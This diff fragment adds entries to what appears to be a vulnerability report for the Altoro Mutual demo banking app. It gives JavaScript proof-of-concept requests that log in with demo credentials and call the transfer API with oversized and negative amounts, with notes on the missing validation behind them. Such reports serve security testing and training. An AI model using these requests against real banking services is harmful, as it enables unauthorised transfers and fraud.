@@ -147,6 +147,37 @@ Report content:
         headers: { 'Content-Type': 'application/json', Authorization: auth },
         method: 'POST',
         body: JSON.stringify({
+          toAccount: '800004',
+          fromAccount: '800005',
+          transferAmount: '1000000000000'
+        })
+      })
+    ).json();
+  - Cause: OperationsUtil.doApiTransfer does not do business logic checks before calling DBUtil.transferFunds
+  - Impact: users can transfer negative funds to each other
+
+- Lack of input validation
+  - Use the following javascript, and observe negative funds get sent from 800004 to 800005:
+    username = 'jdoe';
+    password = 'demo1234';
+    res = await (
+      await fetch('/altoromutual/api/login', {
+        headers: { 'Content-Type': 'application/json' },
+        method: 'POST',
+        body: JSON.stringify({
+          username,
+          password
+        })
+      })
+    ).json();
+
+    auth = res.Authorization;
+
+    res = await (
+      await fetch('/altoromutual/api/transfer', {
+        headers: { 'Content-Type': 'application/json', Authorization: auth },
+        method: 'POST',
+        body: JSON.stringify({
           toAccount: '800005',
           fromAccount: '800004',
           transferAmount: '-2000000'
